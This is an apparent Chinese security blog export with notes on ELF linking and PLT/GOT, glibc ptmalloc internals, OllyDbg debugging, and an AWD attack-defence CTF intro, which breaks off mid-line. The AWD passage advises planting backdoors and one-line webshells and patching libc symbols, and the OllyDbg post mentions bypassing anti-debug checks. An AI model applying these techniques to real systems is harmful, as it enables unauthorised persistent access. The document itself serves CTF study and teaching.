映射过程由操作系统调用加载器函数进行(execve函数也是调用此函数).函数按照可执行文件的程序头表将可执行文件的连续的节映射到连续的内存段中并设置对应内存页的属性,内存页单位为4K,多余部分清零. 程序加载过程中并未真正映射代码和数据到物理内存,而是仅仅创建了对应的页表项(映射虚拟页).映射发生在缺页异常之后.加载器完成加载过程后会跳转到程序入口点(e_entry),也就是_start函数(定义于系统目标文件ctrl.o). 静态链接静态链接. 12gcc -static -o test main.o test.o#等同于ld -o test main.o test.o,ld为静态链接器程序. 静态库是由多个目标模块打包而成的,可用于链接器的输入.例如Linux的存档(archive),后缀为.a. 12ar rcs lib.a test1.o test2.o#liba.a对应链接器时简写:-la 符号解析符号表结构体. 12345678typedef struct &#123; Elf32_Word st_name;//指示符号名在字符串表中的索引,如果此值为0,那么此符号无名字. Elf32_Addr st_value;//符号的值,对应符号地址,例如可重定位目标文件中为相对节起始位置的偏移量,可执行目标文件为绝对运行时地址. Elf32_Word st_size;//对应对象的字节个数. unsigned char st_info;//低四位为符号类型,高四位为符号绑定属性. unsigned char st_other;//指示符号的可见性. Elf32_Half st_shndx;//符号所在节在节头表中的索引.&#125; Elf32_Sym; st_shndx对应的节中有三种特殊的伪节(只存在于可重定位目标文件),其在节头表中无条目.ABS代表不该被重定位的符号;UNDEF代表未定义的符号;COMMON代表未被分配位置的未初始化的数据目标,即未初始化的全局变量,其st_value给出对齐要求,size给出最小的大小. 符号解析的目的是将每一个符号(拥有全局生命周期的变量名与函数名)的引用与一个确定的符号定义建立关联. 其中函数名与已初始化的全局变量名是强符号,未初始化的全局变量名是弱符号,本地符号无强弱之分. 其中强符号只能定义一次,多个弱符号与一个强符号看强符号定义,多个弱符号则任意选择一个(对应COMMON节). 符号解析阶段,链接器按照可重定位目标文件和存档文件在命令行的顺序从左到右扫描,通过维护可重定位目标文件的集合E,未解析符号(还未与对应定义符号关联的引用符号)的集合U,已被加入到E的目标文件定义符号的集合D进行符号解析.初始三个集合为空. 链接器判断命令行中的每一个输入文件的类型. 如果是目标文件则先加入E,然后根据文件的符号引用和定义分别对U,D进行修改,然后继续下一个输入文件处理. 如果是存档文件则会尝试将U中未解析符号与该文件中各目标模块的定义符号匹配,匹配到的符号其所在的模块文件加入E,并修改U,D,循环直到集合不再改变,然后继续下一个输入文件处理. 如果处理过程中向D加入一个已存在的符号(多个强符号)或处理完所有输入文件后U非空(有符号未定义),链接器会在中途报错并停止.否则将E中所有目标文件进行重定位后合并生成可执行目标文件. 其中输入文件的顺序对链接结果是有影响的.解析完成后E中有所有需要的可重定位目标文件,D中有所有定义的符号. 重定位可重定位目标文件的代码区和数据区都是从地址0开始的. 符号解析后每个符号引用都和一个符号定义关联,此时链接器进行重定位. 首先将所有相同类型的节合并为同一类型的新的聚合节,然后将运行时内存地址(虚拟地址)赋给新的聚合节,输入模块定义的节,输入模块定义的符号. 最后链接器根据可重定位目标文件的重定位信息修改代码节和数据节中对每个符号的引用,使得它们指向正确的运行时地址. 可重定位目标文件的.rel.text和.rel·data节中存放着需要重定位的符号的重定位信息,以结构数组的形式存储. 123456typedef struct &#123; Elf32_Addr r_offset; //需要重定位的位置与所在节起始位置的偏移量. Elf32_Word r_info; //对应符号在符号表中的索引值(高24位)以及重定位类型(低8位).&#125; Elf32_Rel; 重定位类型与处理器与系统有关,IA-32处理器有16种重定位类型,ELF定义了32种重定位类型. 最基本的有R_x86_64_PC32(引用处采用PC相对地址方式)和R_x86_64_32(引用处采用绝对地址方式). PC相对地址方式重定位值计算公式:ADDR(sym) - ((ADDR(.text) + r_offset) - r_addend).ADDR(sym)为符号sym运行时存储的地址,ADDR(.text)为.text节运行时地址,r_addend为重定位处的初始值. 绝对地址方式重定位值就是符号sym运行时地址(r_addend为0). 动态链接共享库的代码和数据节不会被复制到可执行文件中,所有引用该库的可执行文件共享此库,在内存中一个共享库的.text节的一个副本会被不同的进程共享. 共享库是一个目标模块能在可执行文件加载或运行时被动态加载到任意内存并动态链接到此程序,此过程由动态链接器完成.Linux的共享库文件后缀为.so文件,Windows后缀为.dll. 123gcc -shared -fpic -o test.so test1.o test2.o#fpic:指生成与位置无关的代码#-shared:指生成一个共享库目标文件 静态链接生成的可执行目标文件可以在被加载后直接运行. 动态链接生成的可执行目标文件在加载时,加载器会通过一个特殊的节.interp(对应段p_type字段值为PT_INTERP)获得动态链接器路径名,动态链接器的实质也是一个共享目标(Linux的ld-linux.so),然后加载并运行这个动态链接器,再由动态链接器加载所使用的共享库文件的代码和数据段到某个内存段,完成重定位工作后将控制权交给程序. Linux系统为动态链接器提供了接口,运行应用程序在运行时加载和链接的共享库. 12345678#include &lt;dlfcn.h&gt;void * dlopen(const char * filename, int flag);//加载和链接共享库void * dlsym(void * handle, char * symbol);//获取对应共享库符号地址int dlclose(void * handle);//卸载共享库 使用以下命令行参数编译即可. 1gcc -rdynamic -o test test.c -ldl 位置无关代码位置无关代码(PIC)指无需重定位即可加载的代码,通过gcc的-fpic编译选项生成(共享库的编译总是使用该选项). 使用这种方法,所有进程可以共享一个共享模块的代码段的单一副本(进程仍拥有自己的数据段). 实际处理过程中会使用PC相对寻址来编译这些应用,而对共享模块定义的外部过程(全局方法)和对全局变量的引用需要一些特殊的技巧. PIC数据引用对全局变量的PIC引用基于代码段任何指令和数据段中任何变量之间的距离都是一个运行时常量(PC相对寻址). 编译器在数据段开始的地方创建了一个表,全局偏移量表(GOT).GOT中每个被本目标模块引用的全局数据目标(过程或全局变量)都有一个8(64位)字节条目.同时编译器为GOT中每个条目生成一个重定位记录,在动态链接时统一重定位,其包含目标的绝对地址,代码段可以通过相对地址获取GOT中对应的绝对地址从而达到PIC. PIC函数调用实际上对于函数调用PIC也是通过GOT获取函数的绝对地址,但获取时间上编译器给了多种选择,一种是动态链接器加载时直接初始化GOT内容(同变量),另一种是延迟绑定,即将地址解析延缓到第一次调用此方法. 具体调用是通过两个数据结构完成的:GOT和过程链接表(PLT).任何一个外部函数都有一个自己的GOT条目和PLT条目. PLT是一个数组,每个条目是一个16字节代码.PLT[0]是一个特殊条目,其负责跳转到动态链接库中.之后就是对应的函数的条目. GOT也是一个数组,GOT[0]和GOT[1]包含动态链接器在解析地址时会用到的信息,而GOT[2]时动态链接器在ld-linux.so模块中的入口点,PLT[0]依靠这三个参数进行地址解析,之后就是对应的函数的条目,再后面就是全局变量条目.所以PLT[1]对应GOT[4]. 具体调用为以下过程. 函数调用实际上为跳转到对应的PLT条目,PLT条目中的第一条指令通过对应GOT地址进行跳转.注意如果没开延迟绑定就会直接跳转到正确的方法中运行. 而开了延迟绑定时对应GOT表初始化内容为对应PLT条目的第二条指令,即将方法对应ID压栈,跳转到PLT[0]进行地址解析并修改对应GOT表. 库打桩机制库打桩机制是Linux链接器支持的一种用于截获对共享跨函数调用的技术. 编译时打桩,使用如下命令行编译.-I.参数告诉C预处理器首先在当前目录查找malloc.h. 12gcc -DCOMPILETIME -c mymalloc.cgcc -I. -o test test.c mymalloc.o 对应malloc.h. 123456//malloc.h#define malloc(size) mymalloc(size)#define free(ptr) myfree(ptr)void * mymalloc(size_t size)void myfree(void * ptr) 对应mymalloc.c 1234567891011#ifdef COMPILETIME#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;void * mymalloc(size_t size) &#123; //code&#125;void myfree(void * ptr) &#123; //code&#125;#endif Linux静态链接器支持链接时打桩.-Wl,option将option传递给链接器(,变成空格),--wrap f告诉链接器将符号f解析为__wrap_f,把符号__real_f解析为f. 123gcc -DLINKTIME -c mymalloc.cgcc -c test.cgcc -Wl,--wrap,malloc -Wl,--wrap,free -o test test.o mymalloc.o 对应mymalloc.c 12345678910111213#ifdef LINKTIME#include &lt;stdio.h&gt;void * __real_malloc(size_t size)void __real_free(void * ptr)void * __wrap_malloc(size_t size) &#123; //code&#125;void __wrap_free(void * ptr) &#123; //code&#125;#endif 运行时打桩实际是依赖于动态链接库寻找机制,通过设置LD_PRELOAD改变加载的动态库.]]></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-源码分析-Linux-ptmalloc-概览]]></title>
    <url>%2Fposts%2F24c64c77%2F</url>
    <content type="text"><![CDATA[前言基于glibc-2.23. Linux进程内存布局Linux系统在装载elf格式的程序文件时,会调用loader把可执行文件中的各个段依次载入到从某一地址开始的空间中,载入地址取决link editor(ld)和机器地址位数. 32位进程内存经典布局. 64与之类似.除了载入位置外最大的不同就是Memory Mapping Segment生长的方向不一样. 内核数据结构mm_struct的成员变量start_code和end_code是进程代码段的起始和终止地址,start_data和end_data是进程数据段的起始和终止地址,start_stack是进程堆栈段起始地址,start_brk和brk是进程主分配区中heap的起始和终止地址. Linux动态内存分配heap和mmap映射区域是可以运行时分配的内存空间.操作系统提供了相关的系统调用来分配内存给这两个区域. 对于heap,操作系统提供了brk()系统调用函数,C运行时库提供了sbrk()函数. 对于mmap,操作系统提供了mmap()和munmap()函数. 内核对brk的实现可以看作是mmap的一个精简版,brk只是改变mm_struct结构的成员变量brk的值. 123#include &lt;unistd.h&gt;int brk(void * addr);void *sbrk(intptr_t increment); sbrk()的参数为0时,sbrk()返回的是进程的当前brk值,为正数时扩展brk值,为负值时收缩brk值. 123#include &lt;sys/mman.h&gt;void * mmap(void * addr, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void * addr, size_t length); mmap()将一个文件或者其它对象映射进内存的整数页,最后一页不使用的空间清零. addr:映射区的起始地址. length:映射区的长度. prot:期望的内存保护标志,不能与文件的打开模式冲突.常用的有:PROT_EXEC,PROT_READ,PROT_WRITE,PROT_NONE(页不可访问,向系统批发一块内存进行管理时设置). fd:文件描述符.如果MAP_ANONYMOUS被设置,其值应为-1. offset:被映射对象内容的起点. flags用于指定映射选项,映射对象的类型和映射页是否可以共享. MAP_NORESERVE:不为这个映射保留交换空间.如果交换空间不被保留且内存不足,对映射区的修改会引起段违例信号.Ptmalloc向系统批发内存时设置. MAP_FIXED:如果指定的内存区重叠于现存的映射空间,重叠部分将会被丢弃.如果指定的起始地址不可用,操作将会失败.起始地址必须落在页的边界上.Ptmalloc回收系统批发的内存时设置. MAP_PRIVATE:建立一个写入时拷贝的私有映射.内存区域的写入不会影响到原文件.和MAP_FIXED互斥.Ptmalloc每次调用mmap都设置. MAP_ANONYMOUS:匿名映射,映射区不与任何文件关联.Ptmalloc每次调用mmap都设置该标志. munmap执行相反的操作,删除特定地址区域的对象映射. 内存管理概览C风格的内存管理:通过调用brk()或mmap()系统调用实现malloc()和free()函数动态分配内存的释放.Doug Lea Malloc,ptmalloc,BSD malloc,Hoard,TCMalloc都属于这一类. 池式内存管理:内存池帮助程序进行自动内存管理,这些程序会经历一些特定的阶段,每个阶段都有特定的内存池.每次内存分配都会从指定内存池中分配内存.每个内存池都有不同的生存期限.(Apache) 引用计数:所有共享的数据结构都有一个域来包含当前结构被引用次数.计数为0则释放内存.(C++智能指针) 垃圾收集:通常会在当可用内存少于一个具体的阈值时运行垃圾收集器,尝试去追踪通过已知数据连接到每一块数据.收集器找到的都是有用的数据,没找到的就是垃圾,可以被销毁.(Java) Ptmalloc内存管理概述ptmalloc分配器处在用户程序和内核之间,响应用户程序的分配请求,向操作系统申请内存并将其返回给用户程序.分配器会预先分配一块大于用户请求的内存,多余的为空闲空间,用户释放的内存也不会立即就返回给操作系统,分配器会管理这些空闲空间.分配器在空闲空间不足的情况下才分配新的内存. 分配区进程可以有一个主分配区和多个非主分配区,Main_arena(主分配区)与non_main_arena(非主分配区)用环形链表进行管理.分配区利用互斥锁mutex使线程对该分配区的访问互斥. 主分配区可以访问进程的heap区域和mmap映射区域.如果主分配区的内存是通过mmap()向系统分配的,当free该内存时,主分配区会直接调用munmap()将该内存归还给系统. 而非主分配区只能访问进程的mmap映射区域,非主分配区使用mmap()向操作系统批发内存. chunk用户请求分配的内存空间在ptmalloc中使用chunk来表示.用户请求释放的内存空间并不会马上归还系统,会先表示为空闲chunk,ptmalloc使用特定的数据结构来管理空闲chunk. ptmalloc在给用户分配的空间前后加上一些控制信息来记录分配的信息. 使用中的chunk(未free). chunk指针指向一个chunk的开始.mem指针才是真正返回给用户的指针. chunk的第二个域的最低一位为P,标识前一chunk是否在使用,为0表示前一chunk空闲,此时此chunk的prev_size有效(前一chunk的size).为1则prev_size无效.ptmalloc分配的第一个chunk总是将P设为1. chunk的第二个域的倒数第二个位为M,表示此chunk是从哪个内存区域获得的虚拟内存.为1表示是从mmap映射区域分配的,为0则是从heap区域分配的. chunk的第二个域的倒数第三个位为A,表示此chunk属于主分配区或者非主分配区,为1表示属于非主分配区,为0则是非主分配区. 空闲chunk. 空闲chunk不存在M状态. 空闲chunk中原本为数据区的地方存储了两个指针,fd指向所在bin(空闲chunk容器,双向链表)的后一空闲chunk,bk指向前一空闲chunk.ptmalloc通过这两个指针将大小相近的chunk连成一个bin. 对于large bin中的空闲chunk,还有两个指针,fd_nextsize和bk_nextsize,用于加快在large bin中查找最近大小匹配的空闲chunk. 空间复用chunk使用中和空闲中的一些域用途不一样,可以被空间复用. 空闲时,一个chunk至少需要4个size_t大小的空间.并且chunk的大小要对齐到8B(64位16B). 使用时,其下一chunk的prev_size是无效的,这部分空间可以被当前chunk使用以达到空间复用.所以一个使用中的chunk的大小的计算公式应该是:in_use_size = (user_size + 8 - 4 ) align to 8(64位(user_size + 16 - 8 ) align to 16).向上对齐. 空闲的chunk和使用中的chunk使用的是同一块空间.所以最终的分配空间chunk_size = max(in_use_size, 16)(64位max(in_use_size, 32)).这就是ptmalloc实际需要分配的内存大小. 空闲chunk容器ptmalloc统一管理heap和mmap映射区域中的空闲chunk,当用户进行下一次分配请求时,ptmalloc会首先试图在空闲chunk中寻找. ptmalloc将相似大小的chunk用双向链表链接起来,这样的一个链表被称为一个bin.ptmalloc一共维护了128个bin,并使用一个数组Bins来存储这些bin. Binsbins数组的第一个为unsorted bin.每个bin都是一个双向链表. 2 - 64标号的bin统称为small bins,同一small bin中的chunk大小相同.相邻small bin的chunk大小相差8bytes(64位16B).释放的chunk被插入链表头部,寻找chunk是从链表尾部开始. small bins后面的被称作large bins.large bins中的bin分别包含给定范围内的chunk,并按大小序排列.相同大小的chunk同small bin按照最近使用顺序排列.ptmalloc使用smallest-first,best-fit原则在large bins中寻找chunk. ptmalloc将空闲chunk插入bins中时会把该chunk的下一chunk标志P设为0.同时把它和它前后的空闲chunk合并为一个chunk放到unstored bin中.ptmalloc会把一些小的chunk先放到fast bins中. ptmalloc使用了一组宏根据需要分配内存块大小计算出所需chunk所属bin的index. bin[0]和bin[127]都不存在,bin[1]为unsorted bin的chunk链表头. Fast Bins不大于global_max_fast的chunk被释放后会被放到fast bins中,ptmalloc并不会把该chunk的下一chunk标志P设为0(不会合并). 给用户分配的chunk不大于global_max_fast时,ptmalloc会先在fast bins中查找,然后去查找bins中的空闲chunk. 在特定的时候,ptmalloc会遍历fast bins中的chunk,将相邻(内存空间)的空闲chunk进行合并,并将合并后的chunk加入unsorted bin中,然后再将unsorted bin里的chunk加入对应small bins和large bins. Fast bins可以看着是LIFO的栈,其中的bin使用单向链表实现. Unsorted Bin释放的chunk大于global_max_fast,或者fast bins中的空闲chunk合并时,这些chunk会被放到unsorted bin队列. 在进行malloc操作的时候,如果在fast bins中没有找到合适的chunk,则ptmalloc会在unsorted bin中查找合适的空闲chunk,然后才查找small bins和large bins.如果unsorted bin不能满足分配要求.malloc便会将unsorted bin中的chunk加入对应small bins和large bins中.然后再从small bins和large bins中继续进行查找和分配. 特殊chunk并不是所有的chunk都按照上面的方式来组织,有三种例外情况:Top chunk,Mmaped chunk和Last remainder chunk. Top chunk在空闲内存的最高处必然存在一块空闲chunk,也就是top chunk.主分配区和非主分配区的top chunk初始化与增长方式是不一样的. 对于主分配区ptmalloc通过sbrk()来增大或是收缩进程heap的大小,初始化时brk的值等于start_brk.主分配区在第一次调用malloc时会分配(chunk_size + 128KB) align 4KB大小的空间作为初始的heap(空闲chunk),也就是初始的top chunk,然后从top chunk分配内存.初始化后如果用户程序请求时top chunk中没有空闲内存,ptmalloc会调用sbrk()将的进程heap的边界brk上移,然后修改top chunk的大小. 对于非主分配区ptmalloc会预先从mmap区域分配一块空闲内存模拟sub-heap(空闲chunk),也就是初始的top chunk,然后从top chunk分配内存.初始化后如果用户程序请求时top chunk中没有空闲内存,ptmalloc会重新分配一个sub-heap,并将top chunk迁移到新的sub-heap上,新的sub-heap与已有的sub-heap用单向链表连接起来. 与top chunk相邻的空闲chunk会在被free时与top chunk合并成新的top chunk,当该次空闲chunk大小达到某个阈值且top chunk的大小超过收缩阈值,就会执行内存收缩减小top chunk的大小(内存归还操作系统),至少保留一个页大小的空闲内存. Mmaped chunk若分配的chunk过大,ptmalloc会使用mmap来直接使用内存映射来将页映射到进程空间.这样分配的chunk(M标志为1)在被free时将直接解除映射,将内存归还操作系统. ptmalloc对mmap threshold有一个动态调整机制.当ptmalloc munmap chunk时,如果回收的chunk空间大于mmap threshold的当前值,并且小于DEFAULT_MMAP_THRESHOLD_MAX(HEAP_MAX_SIZE / 2),ptmalloc会把mmap threshold调整为回收的chunk的大小,并将mmap收缩阈值(mmap trim threshold)设置为mmap threshold的2倍.该机制默认开启,可以用mallopt()关闭. Last remainder chunk当需要分配small chunk,且在small bins,unsorted bin找不到合适的chunk,则通过binmaps遍历bins查找合适的chunk,如果找到则切割该chunk获取一个chunk_size大小的chunk进行分配并将剩余部分(空闲chunk)加入unsorted bin中并将其变成新的last remainder chunk. 当需要分配small chunk,且在small bins中找不到合适的chunk,如果last remainder chunk大于所需small chunk大小,last remainder chunk被分裂成两个chunk,其中一个返回给用户,另一个变成新的last remainder chunk. 内存分配概述ptmalloc的响应用户内存分配要求(malloc)的具体步骤如下. 线程先获取分配区指针(其中涉及加锁和占用),无可用分配区则使用sysmalloc获取内存. 将请求大小转换为实际需要分配的大小,即chunk_size. 如果满足chunk_size &lt;= global_max_fast,则尝试在fast bins找一个所需大小的空闲chunk分配.找不到或者不满足则进行下一步. 如果所需的chunk大小属于small bins,则根据chunk_size找到所在small bin,尝试从其尾部获取一个空闲chunk分配.找不到或者大小不属于small bins则调用malloc_consolidate合并fast bin并链接到unsorted bin后进行下一步. 遍历unsorted bin,如果unsorted bin只有一个chunk(也就是last remainder chunk),而且同时满足chunk_size &lt; 512B和该chunk大小大于等于chunk_size,则直接将该chunk切割并分配.否则根据unsorted bin中chunk的大小将其放入small bins或是large bins中,进行下一步. 到这里fast bins和unsorted bin中所有的chunk都清除干净了.从large bins中按照smallest-first,best-fit原则,找一个合适的chunk,切割出所需大小的chunk进行分配并将剩余部分(空闲chunk)加入unsorted bin并将其变成新的last remainder chunk.没找到则进行下一步. 到这里就需要操作top chunk来进行分配了.判断top chunk大小是否小于chunk_size,是则从top chunk中分出一块来.否则进行下一步. 如果其他线程释放了fast bin(fast bin添加不需要加锁),合并并重新设置当前bin的index,再次循环.否则使用sysmalloc获取内存. 内存回收概述free函数接受一个指向分配区域的指针作为参数,释放该指针所指向的chunk.free函数的工作步骤如下. 判断指针是否为0,为0则直接return.否则进行下一步. 判断所需释放的chunk是否为mmaped chunk(M标志为1),是则调用munmap_chunk()释放mmaped chunk,释放完成.同时如果开启了mmap threshold的动态调整机制,且回收的chunk大小大于mmap threshold,小于mmap分配阈值的最大值,则设置该chunk的大小为mmap threshold,将mmap收缩阈值设定为mmap threshold的2倍.不是则进行下一步. 判断chunk的大小和所处的位置,若chunk_size &lt;= global_max_fast,则将chunk放到fast bins中,释放完成.否则进行下一步. 获取分配区的锁,判断前一chunk是否是空闲块,是则合并.是或不是都进行下一步. 判断下一chunk是否为top chunk,如果不是,则判断下一chunk是否是空闲块,是则合并.下一chunk不是top chunk的情况下都要放到unsorted bin中.如果下一chunk是top chunk,则将其与top chunk合并.然后进行下一步(所有情况). 判断合并后的chunk大小是否大于FASTBIN_CONSOLIDATION_THRESHOLD,是则遍历fast bins中chunk,与相邻的空闲chunk进行合并.进行下一步. 对于主分配区,判断top chunk的大小是否大于mmap收缩阈值,则会试图归还top chunk中的一部分给操作系统(sbrk调用).但最先分配的128KB空间不会归还;对于非主分配区,会进行sub-heap收缩,将top chunk的一部分返回给操作系统,如果top chunk为整个sub-heap,会把整个sub-heap还回给操作系统.到此,释放结束.从free()函数退出. reallocrealloc分以下几种情况. ptr == 0时等同于malloc. ptr != 0 &amp;&amp; size == 0时等同于free,返回值为0. malloc_usable_size(ptr) &gt;= size时会尝试缩减,产生部分free chunk. malloc_usable_size(ptr) &lt; szie时将malloc一块更大的内存,将原来的内容复制过去,再将原来的chunk给free掉. 配置选项概述ptmalloc主要提供以下几个配置选项用于调优,通过mallopt()进行设置. M_MXFASTM_MXFAST用于设置fast bins中保存的chunk的最大大小max_fast,M_MXFAST的最大值为80B,如果设置该选项为0,就会不使用fast bins. 1234567if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE)&#123; LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ()); set_max_fast (value);&#125;else res = 0; M_TRIM_THRESHOLDM_TRIM_THRESHOLD用于设置mmap收缩阈值,默认值为128KB.一般与M_MMAP_THRESHOLD选项一起使用,M_MMAP_THRESHOLD用于设置mmap threshold. M_TRIM_THRESHOLD的值必须设置为页大小对齐,设置为-1会关闭内存收缩设置. 123LIBC_PROBE (memory_mallopt_trim_threshold, 3, value, mp_.trim_threshold, mp_.no_dyn_threshold);mp_.trim_threshold = value;mp_.no_dyn_threshold = 1; M_MMAP_THRESHOLDM_MMAP_THRESHOLD用于设置mmap threshold,默认值为128KB,ptmalloc默认开启动态调整mmap threshold和mmap收缩阈值. 当内存大于mmap threshold,malloc相当于mmap的简单封装,free相当于munmap的简单封装. 12345678if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2) res = 0;else&#123; LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value, mp_.mmap_threshold, mp_.no_dyn_threshold); mp_.mmap_threshold = value; mp_.no_dyn_threshold = 1;&#125; M_MMAP_MAXM_MMAP_MAX用于设置进程中用mmap分配的内存块的最大限制,默认值为64K.如果将M_MMAP_MAX设置为0,ptmalloc将不会使用mmap分配大块内存. 123LIBC_PROBE (memory_mallopt_mmap_max, 3, value, mp_.n_mmaps_max, mp_.no_dyn_threshold);mp_.n_mmaps_max = value;mp_.no_dyn_threshold = 1; mallopt在mallopt()函数配置前,需要检查主分配区是否初始化了,如果没有初始化,调用ptmalloc_init()函数初始化ptmalloc,然后获得主分配区的锁,调用malloc_consolidate()函数,malloc_consolidate()函数会判断主分配区是否已经初始化,如果没有,则初始化主分配区.对mp_中参数字段的修改,是通过主分配区的锁来同步的.]]></content>
      <categories>
        <category>binary</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-OllyDbg]]></title>
    <url>%2Fposts%2Fba79fef5%2F</url>
    <content type="text"><![CDATA[OllyDbgOllyDbg是Windows下的32位汇编程序动态分析调试器. 基本界面 反汇编窗口:显示反汇编代码.双击可修改汇编代码,右键选择Undo selection撤销修改. 寄存器窗口:显示寄存器状态,可以设置不同的显示模式.双击即可修改. 堆栈窗口:显示ESP和EBP寄存器指向地址的信息. 数据窗口:有很多显示模式,可以右键点击选择. 还有部分窗口未直接显示,可通过控制面板上对应的图标打开. L:日志窗口,显示OllyDbg启动时的不同类型信息,还有条件断点的信息.右键选择Log to file可保存文本到文件. E:显示程序运行使用的模块. M:显示程序映射到虚拟内存空间的信息. T:显示程序的线程. W:显示程序. H:句柄窗口. C:返回到OllyDbg的主窗口,CPU窗口. /:显示程序被修改的信息. K:显示调用堆栈的信息. B:显示程序普通断点的列表,不显示硬件断点和内存断点. R:参考窗口,显示OllyDbg中搜索的结果. ...:显示RUN TRACE命令的结果. JIT设置实时调试JIT(JUST IN TIME DEBUGGER). 选择Options-&gt; Just-in-time debugging,点击Make OllyDbg just-in-time debugger后点击done即可. 取消这个特性,只需要点击Restore old just-in-time debugger再点击Done即可. 常用热键 F7:单步步入. F8:单步步过. F9:运行程序. Ctrl+F9:直到出现ret中断. F2:设置或者删除断点(断点的地址栏为红色). F12(Debug-&gt;Run):临时暂停程序. 基本概念入口点:程序被加载的第一条指令的地址.当用OD加载应用程序会停在入口点处.大部分的程序启动的时候都会停在入口点处,开了反调试则不会. 动态链接库(DLL):与正常的可执行文件EXE具有相同的格式.动态链接库可导出函数供其他可执行文件(EXE和DLL)调用.Windows的基本功能:文件,内存,进程,线程,图形,声音,网络等都是在标准的动态链接库中实现的.动态链接库中的函数也称为应用程序接口(API). Command命令 表达式求值:? &lt;expression&gt;. 设置函数断点:bp &lt;funcName&gt;. 断点普通断点(INT 3断点)设置普通断点后,OD会将对应指令处第一个字节指令替换成CC.为了不影响界面显示效果,OD会显示为原字节. 内存断点内存访问断点也称为BPM.这种断点修改内存页的访问属性.不会出现断点列表中,且不能同时设置多个.OD也可以对区段设置内存断点.(同时OllyDbg支持内存访问一次性断点) 硬件断点硬件断点(HBP)是处理器的特性之一,在OD中最多可以设置4个硬件断点. 硬件断点分为:硬件执行断点(ON EXECUTION),硬件写入断点(ON WRITE),硬件访问断点(ON ACCESS)3种. 硬件执行断点与普通的CC断点作用一样,但硬件执行断点并不会将指令首字节修改为CC,所以更难检测.(有些程序会使用一些技巧来清除硬件断点) 条件断点条件断点实际上就是普通的CC断点,只不过该断点的触发需要满足设置的条件,如果满足设置的条件,那么程序就会中断下来. 消息断点Windows消息被广泛用于各种事件的通知上面,可以通过消息来实现系统通知,移动鼠标,按下键盘上的某键等操作. Windows窗口程序至少有一个消息循环,消息循环有特定的API函数构成,最常见的是GetMessage和DispatchMessage函数,有的消息循环也会用到其他的API函数. 对于消息断点来说,只有在窗口创建之后才能够设置消息断点以及拦截消息. 打开Windows窗口,找到对应的窗口右键选择:Message breakpoint on ClassProc.消息断点实际上也是一个条件断点. Run trace,Hit traceRun trace可以把被调试程序执行过的指令保存下来,在Debugging options的Trace标签中进行设置. Hit trace通过断点实现,用于辨别代码是否执行. 常用插件CmdBarCmdBar常用命令. ? expr:表达式求值. D(DB,DW,DD) expr:查看内存数据. BP expr[, condition]:设置断点或条件断点. Hw expr:设置硬件写断点 HideDebugger用于绕过IsDebuggerPresent反调试检测. OllySSEH用于检测模块是否开了SafeSEH. tips 代码被解析为数据:右键,Analysis-&gt;Analyse code或直接Ctrl + A快捷键.还是无法识别可以尝试右键,Analysis-&gt;Remove analysis from module. 反汇编窗口中push E000无法识别:因为OllyDbg反汇编引擎不能识别E是数字还是字母,使用0E000. OllyDbg把所有与程序或模块相关的信息保存在单独的UDD文件中,以便模块重新加载时继续使用. 已经删除断点,OllyDbg重新加载时断点重新出现,将配置文件ollydbg.ini中相应内容改为Backup UDD files=1. OllyDbg调试一些加壳程序运行到断点时可能卡死.将配置文件ollydbg.ini中相应内容改为Restore windows 0.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-AWD-入门]]></title>
    <url>%2Fposts%2F30da0a12%2F</url>
    <content type="text"><![CDATA[简介AWD(Attack With Defence),比赛中每个队伍维护多台服务器,服务器中存在多个漏洞,利用漏洞攻击其他队伍进行得分,修复漏洞避免被其他队伍攻击失分. Defence弱口令更改比赛一般通过ssh连接服务器,首先检查弱口令(包括web后台,mysql等). 1234passwd &lt;username&gt;#修改ssh密码passwd#更改本用户密码 12set password for root@localhost = password('root');#修改mysql密码 备份与恢复将源代码备份本地以供后面恢复. 12tar -zcvf beifen.tar.gz dirtar -zxvf beifen.tar.gz 利用scp命令传输文件或者图形化工具. 12345scp &lt;source_path&gt; &lt;name&gt;@&lt;host&gt;:&lt;dest_path&gt;#上传文件scp &lt;name&gt;@&lt;host&gt;:&lt;source_path&gt; &lt;dest_path&gt;#下载文件#-r递归复制 mysql数据库. 12345#备份mysqldump -u &lt;name&gt; -p --databases &lt;databasesname&gt; &gt; ~/db.sql#恢复mysql -u root -psource ~/db.sql WAF一般准备一个waf.php,上传到tmp目录. 可以使用以下命令在每一个php文件前面加上require_once包含WAF文件. 1sudo find /var/www/html/&lt;path&gt; -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?php\nrequire_once('\/tmp\/waf.php');\n/g" 或者修改php.ini的auto_prepend_file属性,不过需要重启php服务的权限. 1auto_prepend_file = /tmp/waf.php 文件监控FileMonitor. chattrLinux文件有隐藏属性,可以用lsattr命令查看.i表示不得更改文件或目录. 有root或者sudo权限可以使用chattr +i设置隐藏属性.使用chattr -i取消隐藏属性. 例如:将/var/www/html目录下的文件设置为不允许任何人修改:chattr -R +i /var/www/html. 进程监控非root用户是无法隐藏进程的. 一些常用命令. 123456ps aux | grep &lt;str&gt;sudo lsof -i:&lt;port&gt;#orsudo netstat -tunlp | grep &lt;port&gt;#查看指定端口被哪个进程占用 流量监控流量抓取,需要root权限,使用wireshark进行分析. 1tcpdump -s 0 -w log.pcap port 9999 可以从攻击流量中可以得到payload. 找预留后门将web目录备份到本地,使用D盾或者别的扫描工具扫描后门. 留后门给己方服务器多留几个后门/木马.控制用的一句话木马,最好是需要菜刀配置的(避免别人利用). patch二进制程序patch(一般为ELF)可以使用IDA进行修改,IDA提供了byte,word,assemble修改,或者直接dump源码修改重写. 上面两种十分不方便,可以使用一些工具进行修改.推荐LIEF. 12pip install setuptools --upgradepip install lief 修改libc中的符号. 1234567891011import lief#支持ELF,PE,Mach-Olibc = lief.parse("/lib/x86_64-linux-gnu/libc-2.23.so") puts_sym = filter(lambda e: e.name == "puts", libc.dynamic_symbols)[0]system_sym = 